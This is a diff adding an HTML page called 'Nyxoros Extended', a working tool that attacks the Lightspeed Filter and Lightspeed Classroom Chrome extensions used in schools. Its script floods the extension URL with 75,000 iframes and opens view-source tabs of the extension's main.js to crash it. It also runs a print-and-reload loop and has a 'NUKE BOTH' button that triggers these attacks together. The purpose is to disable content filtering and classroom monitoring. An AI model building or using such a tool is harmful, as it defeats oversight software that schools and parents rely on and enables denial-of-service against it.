@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nyxoros Extended</title>
+    <style>
+        /* Base Styles */
+        * {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #1a1d22;
+            color: #fff;
+            display: flex;
+            margin-left: 250px;
+            font-size: 16px;
+        }
+
+        /* Side Panel */
+        .side-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 250px;
+            height: 100vh;
+            background-color: #26292e;
+            padding: 30px 20px;
+            border-right: 2px solid #444;
+        }
+
+        .side-panel h2 {
+            font-size: 22px;
+            margin-bottom: 40px;
+        }
+
+        .side-panel .option {
+            padding: 12px 20px;
+            margin: 10px 0;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background 0.3s;
+        }
+
+        .side-panel .option:hover {
+            background-color: #373b3e;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex-grow: 1;
+            padding: 30px 40px;
+        }
+
+        /* Exploit Controls */
+        .exploit-section {
+            background: #222529;
+            padding: 20px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+
+        .target-selector {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            background: #292a2d;
+            border: 1px solid #444;
+            color: #fff;
+            border-radius: 8px;
+        }
+
+        .exploit-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .exploit-btn {
+            background: #007BFF;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .exploit-btn.nuke {
+            background: #dc3545;
+            grid-column: span 2;
+        }
+
+        /* Settings */
+        .settings-section {
+            background: #222529;
+            padding: 20px;
+            border-radius: 12px;
+        }
+
+        .settings-group {
+            margin: 20px 0;
+        }
+
+        .switch-container {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+        }
+
+        .auto-close-label {
+            margin-right: 15px;
+        }
+
+        /* Print/Reload Controls */
+        .print-reload-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #26292e;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        /* Popups */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .popup-content {
+            background: #1a1d22;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+        }
+    </style>
+</head>
+<body>
+    <div class="side-panel">
+        <h2>Nyxoros Extended</h2>
+        <div class="option" data-section="exploit">Exploit Tools</div>
+        <div class="option" data-section="settings">Settings</div>
+    </div>
+
+    <div class="main-content">
+        <!-- Exploit Section -->
+        <div class="exploit-section" id="exploit">
+            <select class="target-selector" id="targetSelector">
+                <option value="filter">Lightspeed Filter</option>
+                <option value="classroom">Lightspeed Classroom</option>
+            </select>
+
+            <div class="exploit-buttons">
+                <button class="exploit-btn" onclick="startPrintReload()">Print & Reload</button>
+                <button class="exploit-btn" onclick="disableExtension()">Disable Extension</button>
+                <button class="exploit-btn" onclick="crashExtension()">Source Spam</button>
+                <button class="exploit-btn nuke" onclick="nukeExtensions()">NUKE BOTH</button>
+            </div>
+        </div>
+
+        <!-- Settings Section -->
+        <div class="settings-section" id="settings" style="display: none;">
+            <div class="settings-group">
+                <h3>Tab Management</h3>
+                <div class="switch-container">
+                    <span class="auto-close-label">Auto-Close Tabs:</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoCloseToggle" checked>
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="settings-group">
+                <h3>Advanced</h3>
+                <button class="exploit-btn" onclick="stopProcesses()">Stop All Processes</button>
+            </div>
+        </div>
+
+        <!-- Print/Reload Status -->
+        <div class="print-reload-container">
+            <p>Print/Reload Status: <span id="statusIndicator">Inactive</span></p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const EXTENSIONS = {
+            filter: {
+                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
+                name: 'Lightspeed Filter'
+            },
+            classroom: {
+                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
+                name: 'Lightspeed Classroom'
+            }
+        };
+
+        // State Management
+        let currentTarget = EXTENSIONS.filter;
+        let printReloadInterval = null;
+        let autoCloseEnabled = true;
+
+        // Event Listeners
+        document.getElementById('targetSelector').addEventListener('change', (e) => {
+            currentTarget = EXTENSIONS[e.target.value];
+        });
+
+        document.getElementById('autoCloseToggle').addEventListener('change', (e) => {
+            autoCloseEnabled = e.target.checked;
+        });
+
+        // Core Functions
+        function startPrintReload() {
+            if (!printReloadInterval) {
+                window.print();
+                printReloadInterval = setInterval(() => {
+                    location.reload();
+                    window.print();
+                }, 10000);
+                updateStatus('Active');
+            }
+        }
+
+        function disableExtension() {
+            const iframeCount = 75000;
+            const extUrl = `chrome-extension://${currentTarget.id}/`;
+            const printerWindow = window.open('', '_blank');
+            
+            // Create iframes
+            for (let i = 0; i < iframeCount; i++) {
+                const iframe = document.createElement('iframe');
+                iframe.src = extUrl;
+                printerWindow.document.body.appendChild(iframe);
+            }
+
+            // Auto-close handling
+            if (autoCloseEnabled) {
+                setTimeout(() => printerWindow.close(), 30000);
+            }
+        }
+
+        function crashExtension() {
+            const tabsCount = 5;
+            const windows = [];
+            const sourceUrl = `view-source:chrome-extension://${currentTarget.id}///main.js`;
+
+            for (let i = 0; i < tabsCount; i++) {
+                const win = window.open(sourceUrl, `crash_${i}`);
+                if (win) windows.push(win);
+            }
+
+            if (autoCloseEnabled) {
+                setTimeout(() => windows.forEach(win => win.close()), 30000);
+            }
+        }
+
+        function nukeExtensions() {
+            disableExtension();
+            crashExtension();
+            alert('NUKE INITIATED!');
+        }
+
+        function stopProcesses() {
+            clearInterval(printReloadInterval);
+            printReloadInterval = null;
+            updateStatus('Inactive');
+            alert('All processes stopped!');
+        }
+
+        // Helper Functions
+        function updateStatus(text) {
+            document.getElementById('statusIndicator').textContent = text;
+        }
+
+        // Tab Management
+        document.querySelectorAll('.option').forEach(option => {
+            option.addEventListener('click', () => {
+                document.querySelectorAll('.option').forEach(o => o.classList.remove('active'));
+                option.classList.add('active');
+                document.querySelectorAll('.main-content > div').forEach(div => {
+                    div.style.display = 'none';
+                });
+                document.getElementById(option.dataset.section).style.display = 'block';
+            });
+        });
+
+        // Initialize
+        document.querySelector('.option').click();
+    </script>
+</body>
+</html>
